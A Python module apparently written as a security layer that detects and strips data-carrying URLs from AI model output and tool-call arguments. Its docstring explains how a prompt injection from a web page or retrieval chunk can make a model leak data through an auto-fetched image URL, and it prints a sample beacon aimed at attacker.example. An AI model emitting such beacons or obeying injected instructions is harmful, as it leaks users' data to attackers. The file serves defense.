"""
exfil_guard.py
Layer 3b: closes the side channels through which text that passed every
other check still leaves the building.

The output guard redacts secrets it can *recognise*. That does nothing
about the case where the model — following an injected instruction it read
from a web page or a RAG chunk — encodes data the user is entitled to see
into a URL that the client fetches on its own:

    ![](https://attacker.example/p.png?d=c2stbGl2ZS1hYmMxMjM)

Nothing here is "output" in the visible sense. The user sees a broken
image; the attacker sees a request arrive with the payload in the query
string. No click, no consent, no trace in the rendered conversation. The
same shape works through HTML `img`/`iframe`/`source` attributes, CSS
`url()`, and any tool argument that happens to be a URL.

Two properties decide how a finding is treated:

* **Auto-fetch** — will the renderer request this without the user doing
  anything? Images, iframes, media sources, stylesheets, `srcset`,
  `poster`, CSS `url()` all fetch on render. A plain link does not.
* **Payload shape** — is the URL carrying data rather than identifying a
  resource? Long or high-entropy path/query segments, base64/hex-looking
  blobs, embedded credentials, `data:` URIs.

Auto-fetch plus anything suspicious is treated as exfiltration and blocks
the response, because the user is not in the loop to catch it. A
click-required link with a payload shape is neutralised but not blocked:
the URL is stripped, the surrounding message survives. Either way
`neutralized_text` has every suspicious URL removed, so a caller that
ignores `blocked` still gets the mitigation.

An allowlist sharpens all of this considerably. Without one the guard has
to infer intent from URL shape alone, and a bare `?w=800` on a CDN image
is indistinguishable from a one-character exfil channel. With
`allowed_hosts` set, any auto-fetch URL pointing somewhere else is a
finding regardless of shape — which is the only form of this defence that
holds up against an attacker who bothers to make the payload look boring.
"""

from __future__ import annotations

import math
import re
from collections.abc import Iterable, Mapping, Sequence
from dataclasses import dataclass, field
from urllib.parse import unquote, urlsplit

# ---------------------------------------------------------------------------
# Channel extraction
# ---------------------------------------------------------------------------
# Ordered by precedence: an earlier pattern's match suppresses any later
# match falling inside its span, so the URL inside `![](...)` is reported
# once as a markdown image rather than again as a bare URL.

_MD_IMAGE_RE = re.compile(r"!\[(?P<alt>[^\]]*)\]\(\s*<?(?P<url>[^)\s<>]+)>?(?:\s+[^)]*)?\)")
_MD_IMAGE_REF_RE = re.compile(r"!\[(?P<alt>[^\]]*)\]\[(?P<label>[^\]]+)\]")
_MD_LINK_RE = re.compile(r"(?<!!)\[(?P<text>[^\]]*)\]\(\s*<?(?P<url>[^)\s<>]+)>?(?:\s+[^)]*)?\)")
_MD_REF_DEF_RE = re.compile(
    r"^[ \t]*\[(?P<label>[^\]]+)\]:[ \t]*<?(?P<url>\S+?)>?[ \t]*$", re.MULTILINE
)
# Quoted attribute values may contain spaces (a srcset is a whole candidate
# list), so the three quoting forms are matched separately rather than with
# one space-terminated pattern.
_HTML_ATTR_RE = re.compile(
    r"""<\s*(?P<tag>img|image|iframe|embed|object|audio|video|source|track|script|link|input|body|meta)\b"""
    r"""[^>]*?\b(?P<attr>src|href|data|srcset|poster|background|content)\s*=\s*"""
    r"""(?:"(?P<dq>[^"]*)"|'(?P<sq>[^']*)'|(?P<uq>[^\s>]+))""",
    re.IGNORECASE,
)
_CSS_URL_RE = re.compile(r"url\(\s*['\"]?(?P<url>[^'\")]+?)['\"]?\s*\)", re.IGNORECASE)
_AUTOLINK_RE = re.compile(r"<(?P<url>[a-zA-Z][a-zA-Z0-9+.-]*:[^>\s]+)>")
_BARE_URL_RE = re.compile(r"(?<![\"'=(<\[])\b(?P<url>(?:https?|ftp)://[^\s<>\)\]\"']+)")

# Tags whose referenced resource is fetched on render, with no user action.
_AUTO_FETCH_TAGS = {
    "img", "image", "iframe", "embed", "object", "audio", "video",
    "source", "track", "script", "link", "input", "body", "meta",
}

_BASE64ISH_RE = re.compile(r"^[A-Za-z0-9+/_=-]{16,}$")
_HEXISH_RE = re.compile(r"^[0-9a-fA-F]{24,}$")


@dataclass(frozen=True)
class URLFinding:
    """One URL found in a channel, with why it is (or isn't) suspicious."""

    url: str
    channel: str
    auto_fetch: bool
    severity: str  # "block" | "neutralize" | "notice"
    reasons: tuple[str, ...]
    host: str | None
    span: tuple[int, int]

    @property
    def suspicious(self) -> bool:
        return self.severity in ("block", "neutralize")


@dataclass
class ExfilScanResult:
    original_text: str
    neutralized_text: str
    findings: list[URLFinding] = field(default_factory=list)
    blocked: bool = False

    @property
    def suspicious_findings(self) -> list[URLFinding]:
        return [f for f in self.findings if f.suspicious]

    @property
    def reasons(self) -> set[str]:
        return {reason for f in self.suspicious_findings for reason in f.reasons}


@dataclass
class ExfilPolicy:
    """Knobs for the shape heuristics.

    Defaults lean towards catching the classic zero-click image beacon
    without flagging every CDN URL with a cache-busting parameter. Tighten
    `allowed_hosts` rather than the thresholds if you want real assurance:
    shape heuristics lose to an attacker who pads the payload to look
    ordinary, an allowlist does not.
    """

    allowed_hosts: frozenset[str] = frozenset()
    allow_relative: bool = True
    min_payload_len: int = 24
    max_query_len: int = 96
    entropy_threshold: float = 3.6
    block_data_uris: bool = True
    # Schemes that never belong in generated output.
    denied_schemes: frozenset[str] = frozenset({"file", "javascript", "vbscript", "jar"})

    def host_allowed(self, host: str | None) -> bool:
        if not self.allowed_hosts:
            return True
        if host is None:
            return self.allow_relative
        host = host.lower()
        # A bare domain in the allowlist also covers its subdomains.
        return any(host == allowed or host.endswith(f".{allowed}") for allowed in self.allowed_hosts)


def shannon_entropy(value: str) -> float:
    """Bits per character. Distinguishes `?utm_source=newsletter` from
    `?d=aGVsbG8gd29ybGQgc2VjcmV0`, which is the whole trick."""
    if not value:
        return 0.0
    counts: dict[str, int] = {}
    for char in value:
        counts[char] = counts.get(char, 0) + 1
    length = len(value)
    return -sum((n / length) * math.log2(n / length) for n in counts.values())


class ExfilGuard:
    """Finds and neutralises data-carrying URLs in generated text.

    Example:
        guard = ExfilGuard(allowed_hosts=["cdn.mycorp.com", "mycorp.com"])
        result = guard.scan(model_output)
        if result.blocked:
            ...
        return result.neutralized_text
    """

    def __init__(
        self,
        allowed_hosts: Iterable[str] | None = None,
        policy: ExfilPolicy | None = None,
    ):
        if policy is not None and allowed_hosts is not None:
            raise ValueError("Pass either allowed_hosts or a full policy, not both.")
        if policy is None:
            policy = ExfilPolicy(
                allowed_hosts=frozenset(h.lower().lstrip(".") for h in (allowed_hosts or ()))
            )
        self.policy = policy

    # -- extraction ------------------------------------------------------

    def _raw_matches(self, text: str) -> list[tuple[str, str, bool, tuple[int, int]]]:
        """(url, channel, auto_fetch, span) for every URL-bearing construct,
        with later matches inside an earlier match's span discarded."""
        found: list[tuple[str, str, bool, tuple[int, int]]] = []

        # Reference-style images resolve through a definition elsewhere in
        # the document, so the definition inherits the referencing use.
        image_labels = {m.group("label").lower() for m in _MD_IMAGE_REF_RE.finditer(text)}

        for match in _MD_IMAGE_RE.finditer(text):
            found.append((match.group("url"), "markdown_image", True, match.span()))
        for match in _MD_REF_DEF_RE.finditer(text):
            is_image = match.group("label").lower() in image_labels
            found.append((
                match.group("url"),
                "markdown_reference_image" if is_image else "markdown_reference_link",
                is_image,
                match.span(),
            ))
        for match in _MD_LINK_RE.finditer(text):
            found.append((match.group("url"), "markdown_link", False, match.span()))
        for match in _HTML_ATTR_RE.finditer(text):
            tag = match.group("tag").lower()
            attr = match.group("attr").lower()
            auto = tag in _AUTO_FETCH_TAGS and not (tag == "a" and attr == "href")
            value = match.group("dq") or match.group("sq") or match.group("uq") or ""
            if attr == "srcset":
                # A srcset is a comma-separated candidate list; each entry
                # is a separate fetch target.
                for candidate in value.split(","):
                    url = candidate.strip().split(" ")[0]
                    if url:
                        found.append((url, f"html_{tag}_srcset", auto, match.span()))
            else:
                found.append((value, f"html_{tag}_{attr}", auto, match.span()))
        for match in _CSS_URL_RE.finditer(text):
            found.append((match.group("url"), "css_url", True, match.span()))
        for match in _AUTOLINK_RE.finditer(text):
            found.append((match.group("url"), "autolink", False, match.span()))
        for match in _BARE_URL_RE.finditer(text):
            found.append((match.group("url"), "bare_url", False, match.span()))

        return _drop_nested(found)

    # -- classification --------------------------------------------------

    def _classify(self, url: str, auto_fetch: bool) -> tuple[str, tuple[str, ...], str | None]:
        reasons: list[str] = []
        parts = urlsplit(url)
        scheme = parts.scheme.lower()
        host = parts.hostname

        if scheme in self.policy.denied_schemes:
            reasons.append(f"denied_scheme:{scheme}")
        if scheme == "data":
            # A data: URI in a fetching context can carry an arbitrary
            # payload, and as image/svg+xml it can carry script too.
            if self.policy.block_data_uris:
                reasons.append("data_uri")
        if parts.username or parts.password:
            reasons.append("credentials_in_url")
        if not self.policy.host_allowed(host):
            reasons.append("off_allowlist")

        # Shape: is the URL carrying data rather than naming a resource?
        segments = [seg for seg in parts.path.split("/") if seg]
        query = parts.query
        fragment = parts.fragment
        if len(query) > self.policy.max_query_len:
            reasons.append("long_query")
        for candidate in _payload_candidates(query, fragment, segments):
            decoded = unquote(candidate)
            if len(decoded) < self.policy.min_payload_len:
                continue
            if _BASE64ISH_RE.match(decoded) or _HEXISH_RE.match(decoded):
                reasons.append("encoded_payload")
                break
            if shannon_entropy(decoded) >= self.policy.entropy_threshold:
                reasons.append("high_entropy_segment")
                break
        if auto_fetch and (query or fragment) and "long_query" not in reasons:
            # Weak on its own — plenty of legitimate image URLs carry
            # parameters — but a fetch the user never approved, aimed at a
            # URL carrying caller-controlled data, is the exact shape of the
            # beacon. Enough to strip the URL, not enough to kill the reply.
            reasons.append("auto_fetch_with_parameters")

        if not reasons:
            return "notice", (), host

        hard = {
            "data_uri", "credentials_in_url", "off_allowlist",
            "encoded_payload", "high_entropy_segment", "long_query",
        }
        hard_hit = any(r in hard or r.startswith("denied_scheme") for r in reasons)
        severity = "neutralize"
        if auto_fetch and hard_hit:
            severity = "block"
        return severity, tuple(reasons), host

    # -- public API ------------------------------------------------------

    def find_urls(self, text: str) -> list[URLFinding]:
        findings = []
        for url, channel, auto_fetch, span in self._raw_matches(text):
            severity, reasons, host = self._classify(url, auto_fetch)
            findings.append(URLFinding(
                url=url, channel=channel, auto_fetch=auto_fetch,
                severity=severity, reasons=reasons, host=host, span=span,
            ))
        return findings

    def scan(self, text: str) -> ExfilScanResult:
        findings = self.find_urls(text)
        neutralized = _neutralize(text, findings)
        return ExfilScanResult(
            original_text=text,
            neutralized_text=neutralized,
            findings=findings,
            blocked=any(f.severity == "block" for f in findings),
        )

    def scan_values(self, values: object, _path: str = "") -> list[URLFinding]:
        """Walk a nested structure of tool-call arguments and report every
        suspicious URL in it.

        Tool arguments are the other rendered channel: an agent talked into
        calling `http_get(url=...)` or `send_email(body=...)` exfiltrates
        just as effectively as one that emits an image tag, and that call
        never passes through post_process.
        """
        findings: list[URLFinding] = []
        if isinstance(values, str):
            findings.extend(f for f in self.find_urls(values) if f.suspicious)
        elif isinstance(values, Mapping):
            for key, value in values.items():
                findings.extend(self.scan_values(value, f"{_path}.{key}"))
        elif isinstance(values, Sequence) and not isinstance(values, (bytes, bytearray)):
            for index, value in enumerate(values):
                findings.extend(self.scan_values(value, f"{_path}[{index}]"))
        return findings


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _payload_candidates(query: str, fragment: str, segments: list[str]) -> Iterable[str]:
    for pair in query.split("&"):
        if not pair:
            continue
        _, _, value = pair.partition("=")
        yield value or pair
    if fragment:
        yield fragment
    # Path segments matter too: a beacon can encode into the path and skip
    # the query string entirely (/p/c2VjcmV0.png).
    for segment in segments:
        yield segment.rsplit(".", 1)[0]


def _drop_nested(
    matches: list[tuple[str, str, bool, tuple[int, int]]],
) -> list[tuple[str, str, bool, tuple[int, int]]]:
    """Keep the first (highest-precedence) match covering a region, so one
    URL is not reported once per pattern that happens to see it."""
    kept: list[tuple[str, str, bool, tuple[int, int]]] = []
    for match in matches:
        start, end = match[3]
        if any(
            kept_start <= start and end <= kept_end
            for _, _, _, (kept_start, kept_end) in kept
        ):
            continue
        kept.append(match)
    return kept


def _neutralize(text: str, findings: list[URLFinding]) -> str:
    """Remove suspicious URLs while keeping the surrounding message.

    Replacement is by span, applied right-to-left so earlier spans stay
    valid, and the whole construct goes — not just the URL inside it. A
    markdown image with its `(url)` stripped is still an image node, and a
    renderer given a relative or empty src can still issue a request.
    """
    def placeholder(finding: URLFinding) -> str:
        if finding.auto_fetch:
            return "[embedded content removed by the security layer]"
        # Click-required: keep the human-readable anchor text, drop the
        # destination.
        label = _link_label(original)
        return f"[{label} — link removed by the security layer]" if label else \
            "[link removed by the security layer]"

    suspicious = sorted(
        (f for f in findings if f.suspicious), key=lambda f: f.span[0], reverse=True
    )
    out = text
    seen_spans: set[tuple[int, int]] = set()
    for finding in suspicious:
        if finding.span in seen_spans:
            continue
        seen_spans.add(finding.span)
        start, end = finding.span
        original = out[start:end]

        out = out[:start] + placeholder(finding) + out[end:]
    return out


_LABEL_RE = re.compile(r"^!?\[(?P<label>[^\]]*)\]")


def _link_label(construct: str) -> str:
    match = _LABEL_RE.match(construct)
    return match.group("label").strip() if match else ""


class ExfilAttemptBlocked(Exception):
    """Raised when a tool call's arguments carry a data-bearing URL.

    Distinct from ScopeError: the action itself may be perfectly in scope.
    What is wrong is where its arguments point.
    """

    def __init__(self, findings: Sequence[URLFinding]):
        self.findings = list(findings)
        reasons = sorted({r for f in self.findings for r in f.reasons})
        super().__init__(
            f"Tool call blocked: {len(self.findings)} suspicious URL(s) in arguments "
            f"({', '.join(reasons)})."
        )
